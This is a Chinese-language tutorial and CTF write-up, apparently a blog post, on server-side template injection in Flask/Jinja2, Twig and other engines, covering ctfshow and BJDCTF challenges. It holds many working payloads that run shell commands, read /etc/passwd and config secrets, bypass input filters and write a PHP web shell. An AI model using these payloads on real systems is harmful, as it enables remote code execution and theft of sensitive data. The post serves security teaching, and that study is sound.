# SSTI模版注入

**​​​​​​​1.什么是 SSTI？有什么漏洞危害？**

SSTI 通常是指服务器端模板注入，攻击者可以利用该漏洞在服务器端注入恶意代码或命令，从而执行非授权的操作、获取敏感信息或控制服务器。

- 漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。
* 模板引擎的作用是将模板和数据结合起来生成最终的 HTML 页面或其他格式的文档。正常情况下，用户输入的数据会被模板引擎按照一定的规则进行处理和显示，以确保数据的安全性和正确性。
* 但当应用程序存在 SSTI 漏洞时，攻击者可以通过精心构造输入数据，使其被模板引擎当作代码来执行。例如，攻击者可能会在一个评论框或搜索框中输入特定的代码片段，如果应用程序没有对输入进行充分的验证和过滤，模板引擎就可能会执行这些恶意代码，从而导致漏洞被利用。

**2、如何判断检测 SSTI 漏洞的存在？**

- 输入的数据会被浏览器利用当前脚本语言调用解析执行

**3.SSTI 安全问题在生产环境那里产生？**

- 存在模版引用的地方，如 404 错误页面展示
- 存在数据接收引用的地方，如模版解析获取参数数据

**理解：**

具体举例可以是我们开发的blog想换主题，都是直接换模版，但是数据库不会换，这样一些主题是通过向数据库拿数据来确定数据，如果我们把模版数据换了就会造成注入

**示例：搜索框中触发ssti**

url处的划线部分是编码后的{ {6\*6}} ,出现36便证明了页面存在ssti漏洞

![](https://i-blog.csdnimg.cn/direct/66a1ecea92de46b3b70dc901831578b4.jpeg)

### 所谓[模板引擎](https://so.csdn.net/so/search?q=%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E&spm=1001.2101.3001.7020)

| 编程语言       | web框架            | 模板引擎         |
| ---------- | ---------------- | ------------ |
| Python     | Flask            | Jinja2       |
| Python     | Tornado          | Tornado 模板引擎 |
| Python     | Django           | Django模板引擎   |
| Java       | Spring Boot      | Thymeleaf    |
| Java       | Struts2          | FreeMarker   |
| JavaScript | Express（Node.js） | EJS          |
| JavaScript | Hapi（Node.js）    | Handlebars   |
| PHP        | Symfony          | Twig         |
| PHP        | CodeIgniter      | Smarty       |

不同编程语言有不同的 Web 框架，每个 Web 框架对应一个模板引擎。 

注意：Tornado不但是一个框架，还是个web服务器（表中橙色那个）
### flask基础

**route装饰器路由**

```python
@app.route('/')
```

使用`route()`装饰器告诉Flask 什么样的URL能触发函数。一个路由绑定一个函数。

例如

```python
from flask import flask 
app = Flask(__name__)
@app.route('/')
def test()"
   return 123
@app.route('/index/')
def hello_word():
    return 'hello word'
if __name__ == '__main__':
    app.run(port=5000)
```

访问 http://127.0.0.1:5000/会返回123，但是 访问http://127.0.0.1:5000/index则会返回hello word

在用`@app.route('/')`的时候，在之前需要定义`app = Flask(__name__)`不然会报错

还可设置动态网址

```python
@app.route("/&lt;username&gt;")
def hello_user(username):
  return "user:%s"%username
```
脚本运行

```python
from flask import Flask
from flask import request
from flask import config
from flask import render_template_string
app = Flask(__name__)
​
app.config['SECRET_KEY'] = "flag{SSTI_123456}"
@app.route('/')
def hello_world():
    return 'Hello World!'
​
@app.errorhandler(404)
def page_not_found(e):
    template = '''
{%% block body %%}
       <div class="center-content error">
               <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div> 
{%% endblock %%}
''' % (request.args.get('404_url'))
       return render_template_string(template), 404
​
if __name__ == '__main__':
       app.run(host='0.0.0.0',debug=True)
```

正常是hello world！

但是如果页面不正常就是404，我们随便访问一个没有的页面，就会报错

![image-20240217211918717](https://i-blog.csdnimg.cn/blog_migrate/4b52bfc242a2ddafe8914dc1ae4f6f5e.png)

```python
''' % (request.args.get('404_url'))
    return render_template_string(template), 404
```

通过上面的代码就会发现，none是通过404_url来的，那么我们传参?404_url=1看看结果，果然变成1了

![image-20240217211839689](https://i-blog.csdnimg.cn/blog_migrate/1bed2ed91a6284faa131573ffaf93815.png)

换成`{{7-7}}`

![image-20240217212006509](https://i-blog.csdnimg.cn/blog_migrate/e5f74567b383edcda69abdae04cdef0d.png)

这就是ssti注入

### 模板渲染方法

flask渲染方法有`render_template`和`render_template_string`两种，我们需要做的就是，将我们想渲染的值传入模板的变量里

**render_template()** 是用来渲染一个指定的文件的。
**render_template_string**则是用来渲染一个字符串的。

这个时候我们就需要了解一下flask的目录结构了

```
├── app.py  
├── static  
│   └── style.css  
└── templates  
    └── index.html
```

其中，static和templates都是需要自己新建的。其中templates目录里的index.html就是所谓的模板

我们写一个index.html

```html
<html>
  <head>
    <title>{{title}}</title>
  </head>
 <body>
      <h1>Hello, {{name}}!</h1>
  </body>
</html>
```

这里面需要我们传入两个值，一个是title另一个是name。 我们在server.py里面进行渲染传值

```python
from flask import Flask, request,render_template,render_template_string
app = Flask(__name__)
@app.route('/')   
def index():
   return render_template("index.html",title='Home',name='user')
if __name__ == '__main__':
    app.run(port=5000)
```

在这里，我们手动传值的，所以是安全的

但是如果，我们传值的机会给用户

假如我们渲染的是一句话

```python
from flask import Flask, request,render_template,render_template_string
@app.route('/test')
def test():
    id = request.args.get('id')
    html = '''
    <h1>%s</h1>
    '''%(id)
    return render_template_string(html)
if __name__ == '__main__':
    app.run(port=5000)
```

如果我们传入一个xss就会达到我们需要的效果

传入的值被html直接运行回显，我们对代码进行微改。

```python
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
```

再次传入xss就不能实现了

因为在传入相应的值得时候，会对值进行转义，这样就很能好多而避免了xss这些

所以SSTI注入形成的原因就是：开发人员因为懒惰，没有将渲染模板写成一个文件，而是直接用render_template_string来渲染，当然，如果有传值过程还行，但是如果没有传值过程，传入数据不经过转义，那可能就会导致SSTI注入。 那么漏洞原理就是因为不够严谨的构造代码导致的。

### 魔法方法和内置属性

在写题前，先了解python的一些ssti的魔术方法。 `__class__`

> **用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。** 是类的一个内置属性，表示类的类型，返回**&lt;type ‘type’&gt; ；** 也是类的实例的属性，表示实例对象的类。

```python
>>> ''.__class__
<class 'str'>
>>> ().__class__
<class 'tuple'>
>>> {}.__class__
<class 'dict'>
>>> [].__class__
<class 'list'>
```

`__bases__`

> **用来查看类的基类**，**也可以使用数组索引来查看特定位置的值。** 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的**元组**。注意是直接父类！！！ 使用语法：类名.bases

```python
>>> ''.__class__.__bases__
(<class 'object'>,)
>>> ().__class__.__bases__
(<class 'object'>,)
>>> {}.__class__.__bases__
(<class 'object'>,)
>>> [].__class__.__bases__
(<class 'object'>,)
```

`__mro__`也能获取基类

```python
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
```

`__subclasses__()` 获取当前类的所有子类，即Object的子类

```python
>>> ''.__class__.__bases__[0].__subclasses__()[0]
<class 'type'>
```

而我们注入就是通过拿到Object的子类，使用其中的一些函数，进行[文件读取](https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96&spm=1001.2101.3001.7020)或者命令执行。 `__init__` 重载子类，获取子类初始化的属性。 `__globals__` 函数会以字典的形式返回当前位置的全部全局变量 就比如：`os._wrap_close.__init__.__globals__`，可以获取到os中的一些函数，进行文件读取。

我们可以尝试上面的代码

```markdown
`[].__class__.__base__.__subclasses__()`
```

调用 **class** 方法获取的是 \[\] 所处的类 list。接着，通过 **base** 方法获取了 list 类的基类 object。然后再调用 **subclasses**() 方法，获取的是 object 的所有子类，也就是所有 Python 中定义的类，以及这些类的子类和后代类

![image-20240218212340535](https://i-blog.csdnimg.cn/blog_migrate/4ad1c984d21413e10539dd5fce9cd082.png)

### 文件读取

#### 类的知识总结（转载)

```python
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
​
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1      get传参
request.values.x1    所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1      post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data         post传参 (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {{g}}得到<flask.g of 'flask_ssti'>
```

#### 常见过滤器（转载）

```python
常用的过滤器
​
int()：将值转换为int类型；
float()：将值转换为float类型；
lower()：将字符串转换为小写；
upper()：将字符串转换为大写；
title()：把值中的每个单词的首字母都转成大写；
capitalize()：把变量值的首字母转成大写，其余字母转小写；
trim()：截取字符串前面和后面的空白字符；
wordcount()：计算一个长字符串中单词的个数；
reverse()：字符串反转；
replace(value,old,new)： 替换将old替换为new的字符串；
truncate(value,length=255,killwords=False)：截取length长度的字符串；
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
list()：将变量列成列表；
string()：将变量转换成字符串；
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
abs()：返回一个数值的绝对值；
first()：返回一个序列的第一个元素；
last()：返回一个序列的最后一个元素；
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
length()：返回一个序列或者字典的长度；
sum()：返回列表内数值的和；
sort()：返回排序后的列表；
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count
```

```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() #将read() 修改为 write() 即为写文件

[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #将read() 修改为 write() 即为写文件 #将read() 修改为 write() 即为写文件
```



#### **利用链**

'popen' 对象通常是 Python 中的 subprocess 模块中的一个类或函数，用于执行外部命令并获取其输出。在这种情况下，'popen' 对象的作用是执行系统命令 `whoami` 并返回当前用户的用户名。

直接使用 popen（python2不行）

```python
os._wrap_close 类里有popen
​
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
```

使用 os 下的 popen

```scss
含有 os 的基类都可以，如 linecache
​
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

使用**import**下的os（python2不行）

```markdown
可以使用 __import__ 的 os
​
"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
```

**builtins**下的多个函数

```scss
__builtins__下有eval，__import__等的函数，可以利用此来执行命令
​
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

利用 python2 的 file 类读取文件

```python
在 python3 中 file 类被删除
​
# 读文件
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()
[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()
# 写文件
"".__class__.__bases__[0].__bases__[0].__subclasses__()[40]('/tmp').write('test')
# python2的str类型不直接从属于属于基类，所以要两次 .__bases__
```

flask内置函数

```handlebars
Flask内置函数和内置对象可以通过{{self.__dict__._TemplateReference__context.keys()}}查看，然后可以查看一下这几个东西的类型，类可以通过__init__方法跳到os，函数直接用__globals__方法跳到os。（payload一下子就简洁了）
​
{{self.__dict__._TemplateReference__context.keys()}}
#查看内置函数
#函数：lipsum、url_for、get_flashed_messages
#类：cycler、joiner、namespace、config、request、session
{{lipsum.__globals__.os.popen('ls').read()}}
{{url_for.__globals__['os']['popen']('cat /flag').read()}}
#函数
{{cycler.__init__.__globals__.os.popen('ls').read()}}
#类
```

dict_\_就能找到里面的config

通用 getshell

```handlebars
原理就是找到含有 __builtins__ 的类，然后利用
​
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
#读写文件
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

#### **注入思路**

```python
1.随便找一个内置类对象用__class__拿到他所对应的类
2.用__bases__拿到基类（<class 'object'>）
3.用__subclasses__()拿到子类列表
4.在子类列表中直接寻找可以利用的类getshell
​
对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数
```

以上思路来自这位师傅[CTFshow刷题日记-WEB-SSTI(web361-372)\_ctfshow ssti 371-CSDN博客](https://blog.csdn.net/q20010619/article/details/120493997 "CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客")

### ctf试题：[ctfshow](https://www.ctf.show/)

##### web361

![image-20240218222650227](https://i-blog.csdnimg.cn/blog_migrate/1f75f3d9e13eb757ea53bf6ef4640c93.png)

你好，某某某，可以猜到传参一个应该是name

先试试{{4\*4}}，可以看出是ssti注入

![image-20240218222926684](https://i-blog.csdnimg.cn/blog_migrate/5c9d66bfe319f0d832baafee0a01f403.png)

这里可以判断一下注入类型

![image-20240217151419198](https://i-blog.csdnimg.cn/blog_migrate/bf27d37280fd39b25b8485c22ed06fb4.png)

输入{{4\*‘4’}}，返回16表示是 Twig 模块

输入{{4\*‘4’}}，返回4444表示是 Jinja2 模块

显然是Jinja2 模块

![image-20240218223156150](https://i-blog.csdnimg.cn/blog_migrate/fba14904ef17bd2f55f1708bcfe011e1.png)

查找可以利用的函数

```handlebars
`?name={{''.__class__.__base__.__subclasses__()}}`
```

提供 os.\_wrap_close 中的 popen 函数

![image-20240218223323922](https://i-blog.csdnimg.cn/blog_migrate/19e03266c80b763a0cb8b68c2c8cda5d.png)

这很麻烦需要一个一个数，第132个子类

但是网上好像有脚本，可以试试

所以payload

```handlebars
`?name={{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()}}`
```

也可以直接用 lipsum 和 cycler 执行命令

```handlebars
?name={{lipsum.__globals__['os'].popen('tac ../flag').read()}}
?name={{cycler.__init__.__globals__.os.popen('ls').read()}}
```

或者用控制块去直接执行命令

```php
`?name={% print(url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()"))%}`
```

1.  `{% ... %}`：这表示一个模板语句块，在 Flask 中，这用于执行模板中的代码。
2.  `url_for`：这是 Flask 中用于生成 URL 的函数。
3.  `url_for.__globals__`：这是 `url_for` 函数对象的全局命名空间，其中包含了函数被定义时的全局命名空间。
4.  `['__builtins__']`：这是 Python 中每个模块都有的一个属性，包含了内置函数和异常的命名空间。
5.  `['eval']`：这是 Python 内置函数 `eval` 的引用，允许执行字符串中的 Python 表达式。
6.  `("__import__('os').popen('cat ../flag').read()")`：这是一个字符串，其中包含了一个 Python 表达式，它会导入 `os` 模块，执行 `cat ../flag` 命令来读取敏感文件的内容，并返回该内容。
7.  `__builtins__['eval']("__import__('os').popen('cat ../flag').read()")`：这是在模板中执行内置函数 `eval`，并传入上述字符串作为参数，实际上就是执行了敏感操作。
8.  `print(...)`：这是 Python 中的打印函数，用于将 `eval` 函数的结果打印出来。

##### web362

发现2和3被过滤了

![image-20240219143303596](https://i-blog.csdnimg.cn/blog_migrate/451186761703d4dfcd222afd17a3c867.png)

绕过方法：用全角数字 ‘０’,‘１’,‘２’,‘３’,‘４’,‘５’,‘６’,‘７’,‘８’,‘９’

全角：是一种电脑字符，是指一个全角字符占用两个标准字符（或两个半角字符）的位置。全角占两个字节。

半角：是指一个字符占用一个标准的字符位置。半角占一个字节。

```handlebars
?name={{"".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}}   
​
?name={{a.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')}}
​
?name={{''.__class__.__bases__[0].__subclasses__()[１３２].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}
​
?name={{ config.__class__.__init__.__globals__['os'].popen('cat ../flag').read() }}
```

##### web363

过滤了单引号、双引号

**get 传参方式绕过**

```handlebars
?name={{lipsum.__globals__.os.popen(request.args.ocean).read()}}&ocean =cat /flag
//因为传参会自动补上双引号
​
?name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=cat /flag
```

##### web364

过滤了单双引号，args

values 可以获取所有参数，从而绕过 args

```handlebars
`?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag`
```

也可以通过 cookie 绕过

```handlebars
?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}
a=os;b=popen;c=cat /flag
```

![image-20240219152316704](https://i-blog.csdnimg.cn/blog_migrate/5583e29b6d792fddd588222caad97bd5.png)

##### web365

fuzz 字典跑一遍，发现单双引号、args、\[\]被过滤

**方法一：values传参** values 没有被过滤

```handlebars
`?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag`
```

**方法二：cookie传参**

```handlebars
?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
Cookie:c=cat /flag
```

##### web366

过滤了单双引号、args、中括号\[\]、下划线

传参绕过检测

values依旧

```handlebars
?name={{(lipsum|attr(request.values.a)).os.popen(request.values.c).read()}}&a=__globals__&c=cat /flag
因为后端只检测 name 传参的部分，所以其他部分就可以传入任意字符，和 rce 绕过一样
```

`attr()` 通常用于从对象中获取属性或调用方法，而 `get()` 则用于从字典中安全地获取值，并提供一个默认值来避免 KeyError 错误。在上下文中，如果是在 Flask 的模板中使用 `attr()`，通常是用来获取对象的属性值；而 `get()` 则是 Python 中字典的常用方法，用于获取键对应的值。

cookie也是

```handlebars
?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
​
cookie:a=__globals__;b=cat /flag
```

##### web367

过滤了单双引号、args、中括号\[\]、下划线、os

```handlebars
`?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag`
```

##### web368

过滤单双引号、args、中括号\[\]、下划线、os、{{

**{%绕过**

只过滤了两个左括号，没有过滤 {%

```python
`?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag`
```

#### \[BJDCTF2020\]The mystery of ip

发现flag页面会出现ip

![image-20240121221116659](https://i-blog.csdnimg.cn/blog_migrate/fce65f4260363284853347263fa9b935.png)

推断

1.  `X-Forwarded-For`注入
2.  **PHP**可能存在**Twig模版注入漏洞**

结合题目名，**IP的秘密**，flag页面也出现了**IP**，猜测为`X-Forwarded-For`处有问题 使用**BurpSuite**抓取数据包：

```
X-Forwarded-For: 1
```

![image-20240121221435582](https://i-blog.csdnimg.cn/blog_migrate/eea94e5b05a9e9c6b5a75e903615c207.png)

```
X-Forwarded-For: {{9\*9}}
```

![image-20240121221542671](https://i-blog.csdnimg.cn/blog_migrate/ecea1839537eeaa646b564ad88196e5a.png)

被成功执行，说明`XFF`可控，测试了半天，因为是php页面，所以没想到模版注入，通过查阅资料 **Flask**可能存在**Jinjia2模版注入漏洞** **PHP**可能存在**Twig模版注入漏洞**

模版中算式被成功执行，尝试是否能执行命令：

```
X-Forwarded-For: {{system('ls')}}
```

![image-20240121221842888](https://i-blog.csdnimg.cn/blog_migrate/7d001fbb199c19ad23ede9185cff8a13.png)

在`/`目录下查找到flag，

```
X-Forwarded-For: {{system('ls /')}}
```

找到flag文件

![image-20240121222029087](https://i-blog.csdnimg.cn/blog_migrate/369dcf61185397b462ef9acaf48ab1be.png)

读取flag，构造payload：

```
X-Forwarded-For: {{system('cat /flag')}}
```

![image-20240121222246910](https://i-blog.csdnimg.cn/blog_migrate/fb78a811b875e9ca5ca7959a9314b4cc.png)

#### \[BJDCTF2020\]Cookie is so stable

先发现有flag页面和Hint页面，dirsearch扫完也没有获得什么

falg输入什么就返回什么

![image-20240217150635267](https://i-blog.csdnimg.cn/blog_migrate/8e66b74012c7f22c38bd8737cc11f697.png)

题目提到cookie，抓包看看

![image-20240217151048006](https://i-blog.csdnimg.cn/blog_migrate/2ac5f42936574c874dde3793d434efda.png)

猜测是ssti注入

输入user={{7\*'7'}}测试一下，确实存在（注意cookie的user前面的连接是;）

![image-20240217151205259](https://i-blog.csdnimg.cn/blog_migrate/b0e4d932f8e01ada9f4db9266acd27de.png)

同时也判断了ssti注入的类型

输入{{7\*‘7’}}，返回49表示是 Twig 模块

输入{{7\*‘7’}}，返回7777777表示是 Jinja2 模块

![image-20240217151419198](https://i-blog.csdnimg.cn/blog_migrate/1d8473c711d0f200f23caa8bd351995b.png)

模板注入是Twig注入

所以是有固定的payload

```
{{\_self.env.registerUndefinedFilterCallback("exec")}}{{\_self.env.getFilter("id")}}
```

同样的方法，在cookie输入

![image-20240217151635539](https://i-blog.csdnimg.cn/blog_migrate/e87a1d0d483259a5a27ac96a0defd804.png)

查看flag

```
{{\_self.env.registerUndefinedFilterCallback("exec")}}{{\_self.env.getFilter("cat /flag")}}
```

![image-20240217151713479](https://i-blog.csdnimg.cn/blog_migrate/4753db4b60a574ad8a99b8704c0de84e.png)

twig常用的注入payload：

```handlebars
{{'/etc/passwd'|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{["id"]|map("system")|join(",")
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
{{["id",0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0,0]|reduce("system","id")|join(",")}}
{{['cat /etc/passwd']|filter('system')}}
```


##  三，[漏洞复现](https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0&spm=1001.2101.3001.7020)

Web 安全漏洞中遇到服务器端模板注入，需要先判断模板引擎，再根据模板引擎来构造输入。

### 1，如何判断其所属的模板引擎？

（1），Jinja2（Python）

简单表达式测试：输入 { { 5 + 3 }}，若页面返回 8，可能是Jinja2

控制结构测试：输入 {% for i in range(3) %}{ { i }}{% endfor %}，若页面输出 012，进一步表明是Jinja2

过滤器测试：输入 { { 'hello'|upper }}，若页面返回 HELLO，符合Jinja2语法

（2），Tornado 模板引擎（Python） 

表达式测试：输入 { { 5 + 3 }}，若页面返回 8，可能是Tornado模板引擎。

逻辑控制测试：输入 {% for i in \[0, 1, 2\] %}{ { i }}{% end %}，若页面输出 012，符合Tornado语法。

（3）， Django 模板引擎（Python）

简单表达式与过滤器测试：输入 { { 5|add:3 }}，若页面返回 8，可能是Django模板引擎

逻辑判断测试：输入 {% if 5 > 3 %}True{% else %}False{% endif %}，若页面返回 True，符合Django语法。

（4），EJS（JavaScript，用于Node.js的Express框架）

表达式输出测试：输入 &lt;%= 5 + 3 %&gt;，若页面返回 8，可能是EJS。

&nbsp;JavaScript代码嵌入测试：输入&lt;% for (let i = 0; i < 3; i++) { %&gt;&lt;%= i %&gt;&lt;% } %&gt;，若页面输出 012，符合EJS语法。

（5），Thymeleaf（Java，常用于Spring Boot）

变量表达式测试：输入 ${5 + 3}，若页面返回 8，可能是Thymeleaf。

条件判断测试（使用Thymeleaf属性）：输入（在HTML标签中） &lt;p th:if="${5 &gt; 3}">True&lt;/p&gt;，若页面显示 True，符合Thymeleaf语法。

（6），Handlebars（JavaScript）

变量输出测试：输入 { { someVariable }}（假设传递了 someVariable变量），若页面显示该变量的值，可能是Handlebars。

部分模板调用测试：输入 { {> partialTemplate }}（假设定义了 partialTemplate 部分模板），若页面正确渲染部分模板内容，则是Handlebars。  
 

### 2，判断清楚后开始注入

#### （1）Jinja2（Python）

##### 针对 Flask 应用的攻击

* 读取 Flask 应用的 `FLAG`
    * 输入：`{ { url_for.__globals__['current_app'].config['FLAG'] }}`
    * 原理：`url_for` 是 Flask 函数，`__globals__` 指向其全局命名空间，`current_app` 是 Flask 应用实例，`config` 存储配置信息，攻击者借此获取敏感的 `FLAG`。
* 执行任意 Python 代码（通过导入模块）
    * 输入：`{ { url_for.__globals__['__import__']('os').popen('ls /').read() }}`
    * 原理：利用 `__import__` 动态导入 `os` 模块，用 `os.popen` 执行系统命令 `ls /` 并读取输出。
* 获取 Flask 应用的所有配置项
    * 输入：`{ { url_for.__globals__['current_app'].config.items() }}`
    * 原理：访问 `config.items()` 获取 Flask 应用所有配置项及对应值，可能包含数据库连接信息、API 密钥等敏感信息。

##### 读取文件

* 读取 `/etc/hosts` 文件
    * 输入：`{ { ''.__class__.__mro__[2].__subclasses__()[40]('/etc/hosts').read() }}`
    * 原理：与读取 `/etc/passwd` 类似，通过 Python 内置对象和方法定位到文件操作类，读取指定文件内容。
* 动态指定文件路径
    * 输入：`{ { request.args.file|string.__class__.__mro__[2].__subclasses__()[40](request.args.file).read() }}?file=/etc/hosts`
    * 原理：利用请求参数动态指定要读取的文件路径，增加攻击的灵活性。

##### 执行系统命令

* 查看当前工作目录
    * 输入：`{ { ''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['os'].popen('pwd').read() }}`
    * 原理：使用 `os.popen` 执行 `pwd` 命令，返回当前工作目录。
* 查看系统进程信息
    * 输入：`{ { ''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['os'].popen('ps -ef').read() }}`
    * 原理：执行 `ps -ef` 命令，查看系统中所有进程的详细信息。

##### 加载并执行 Python 模块

* 导入并执行 `socket` 模块
    * 输入：`{ { ''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['__import__']('socket').gethostname() }}`
    * 原理：通过 `__import__` 函数动态导入 `socket` 模块，然后调用 `gethostname` 方法获取主机名。
        

#### （2），Tornado 模板引擎（Python）

##### 信息获取类

* 获取应用配置信息
    * 输入：`{ { handler.settings }}`
    * 原理：在 Tornado 框架里，`handler` 通常指继承自 `tornado.web.RequestHandler` 的请求处理类实例，`settings` 是 Tornado 应用程序的配置设置对象。此表达式可输出当前请求处理类实例所关联的应用配置信息，若配置信息包含敏感内容，直接输出会导致信息泄露。
* 获取请求相关信息
    * 输入：`{ { handler.request }}`
    * 原理：`handler.request` 包含了客户端请求的详细信息，如请求方法、请求头、请求参数等。攻击者可借此了解请求的上下文，为后续攻击做准备。

##### 读取文件

* 读取 `/proc/version` 文件（获取系统版本信息）
    * 输入：`{ { ''.__class__.__mro__[2].__subclasses__()[40]('/proc/version').read() }}`
    * 原理：同 Jinja2 读取文件原理，利用 Python 内置对象和方法读取指定文件内容。

#### （3）Django 模板引擎（Python）

##### 利用视图传递对象属性

* 假设视图传递了 `settings` 对象获取数据库配置
    * 输入：`{ { settings.DATABASES.default }}`
    * 原理：尝试访问视图传递的 `settings` 对象中的数据库配置信息。
* 假设视图传递了 `request` 对象获取请求信息
    * 输入：`{ { request.META }}`
    * 原理：获取请求的元数据信息，可能包含客户端 IP、请求头信息等。

##### 绕过过滤器限制（若存在）

* 假设存在一个自定义过滤器限制了输出
    * 输入：`{ { 'a'|add:'b'|add:'c' }}`
    * 原理：通过多个过滤器组合绕过单一过滤器的限制，拼接字符串。

#### （4），EJS（JavaScript，用于 Node.js 的 Express 框架）

##### 读取文件

* 读取项目根目录下的 `package.json` 文件
    * 输入：`<% var fs = require('fs'); console.log(fs.readFileSync('./package.json', 'utf8')) %>`
